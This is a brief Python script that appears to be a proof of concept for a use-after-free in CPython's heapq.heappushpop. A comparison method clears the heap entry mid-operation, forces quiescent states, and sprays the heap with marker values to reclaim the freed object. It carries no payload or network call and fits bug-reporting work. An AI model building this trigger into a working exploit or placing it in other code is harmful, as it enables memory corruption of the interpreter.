import heapq
import sys

class Target:
    def __init__(self):
        self.a = 0x11223344
        
    def __lt__(self, other):
        heap[0] = None
        
        # Do a lot of bytecode to trigger QSBR quiescent states
        x = 0
        for i in range(1000000):
            x += i
            
        global spray
        spray = []
        for i in range(100):
            spray.append([0x13371337]*5)
            
        print('Spray done')
        print(f'self type: {type(self)}')
        return False

    def __del__(self):
        print('Target deleted!')

heap = [Target()]

print('Calling heappushpop...')
heapq.heappushpop(heap, b"some item")
print('Done')
